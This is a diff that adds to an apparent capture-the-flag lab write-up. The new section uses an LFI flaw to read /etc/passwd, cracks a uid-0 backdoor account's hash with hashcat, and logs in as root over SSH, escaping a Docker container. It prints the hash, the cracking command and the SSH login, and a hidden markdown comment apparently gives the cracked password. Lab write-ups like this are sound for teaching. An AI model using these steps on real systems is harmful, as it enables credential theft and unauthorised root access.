@@ -949,10 +949,44 @@ Apart the victim, we found another active host in the network, that actualy is t
     8080/tcp  open  http-proxy syn-ack
     33060/tcp open  mysqlx     syn-ack
 
-The wonderful thing of ligolo-ng is that it operates in a tunnell mode, like a VPN, so we can directly visit the http services with our browser. Actually we found a copy of the the main site on port 80 and a copy of the dev site on 8080.
+The wonderful thing of ligolo-ng is that it operates in a tunnell mode, like a VPN, so we can directly visit the http services with our browser. Actually we found a copy of the the main site on port 80 and a copy of the dev site on 8080. Again I used the LFI vulnerability to download <b>/etc/passwd</b> file, even if generally it's not useful in modern Linux system, this time I found an entry that I tried to reverse using hashcat:
+
+    zeus:$6$Zs4KmlUsMiwVLy2y$V8S5G3q7tpBMZip8Iv/H6i5ctHVFf6.fS.HXBw9Kyv96Qbc2ZHzHlYHkaHm8A5toyMA3J53JU.dc6ZCjRxhjV1:0:0:root:/root:/bin/bash
+This seems to be a persistence technique, maybe inserted by another user (?). Since that user will have a root shell once logged in, it deserve to try to reverse the password.
+I run hashcat on my winzoz box to take advantage of my GPU:
+
+    hashcat.exe -a 0 -m 1800 zeux.txt C:\Users\filippo\wordlist\rockyou.txt
+    ...
+    $6$Zs4KmlUsMiwVLy2y$V8S5G3q7tpBMZip8Iv/H6i5ctHVFf6.fS.HXBw9Kyv96Qbc2ZHzHlYHkaHm8A5toyMA3J53JU.dc6ZCjRxhjV1:lxxxxxxxx
+    Session..........: hashcat
+    Status...........: Cracked
     
+[//]: # (linuxrulez)
 
+To me it tooks 2 minutes to reverse the password having NVIDIA GF 4050. Since port SSH is open we can try to login to the remote host:
 
+    ssh zeus@192.168.100.1
+Strange enough once logged in we are root!
+
+    root@ip-10-200-95-33:~# users
+    zeus
+    root@ip-10-200-95-33:~# id zeus 
+    uid=0(root) gid=0(root) groups=0(root)
+    root@ip-10-200-95-33:~# 
+since the uid for zeus is set to 0!
+### Flag submissions 2 and 3
+You can find these flags.
+
+Futher investigate the server we can notice we <i>escaped</i> from a DOcker containers:
+
+    ifconfig 
+    br-19e3b4fa18b8: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
+        inet 192.168.100.1  netmask 255.255.255.0  broadcast 192.168.100.255
+    ...
+    eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 9001
+        inet 10.200.95.33  netmask 255.255.255.0  broadcast 10.200.95.255
+
+We can notice that using SSH, through docker interface, we were able to login on the host machine.
 
     
 
